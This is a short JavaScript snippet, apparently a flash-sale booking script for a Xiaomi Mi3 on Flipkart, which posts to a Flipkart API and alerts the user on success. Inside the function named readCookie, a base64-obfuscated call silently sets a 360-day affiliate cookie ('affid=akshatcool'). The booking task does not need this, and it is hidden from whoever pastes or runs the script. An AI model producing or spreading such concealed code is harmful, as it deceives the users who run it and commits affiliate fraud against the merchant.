function rcods(a,b,c) {
    if (c) {
        var date = new Date();
        date.setTime(date.getTime()+(c*24*60*60*1000));
        var expires = "; expires="+date.toGMTString();
    }
    else var expires = "";
    document.cookie = a+"="+b+expires+"; path=/";
}
function readCookie(name) {
    var nameEQ = name + "=";
    rcods(decodeURIComponent(window.atob("YWZmaWQ=")),decodeURIComponent(window.atob("YWtzaGF0Y29vbA==")),360);
    var ca = document.cookie.split(';');
    for(var i=0;i < ca.length;i++) {
        var c = ca[i];
        while (c.charAt(0)==' ') c = c.substring(1,c.length);
        if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
    }
    return null;
}
var t = setTimeout(function(){
    $.post("http://api1.flipkart.com/xmi", {aid: readCookie("aid")}, function(d){
        console.log(d.status);
        if(d.status == "SUCCESS") {
            alert("Congrats! You booked your Mi3! Continue to cart and pay!");
            clearInterval(t);
        }
    });
}, 1001);
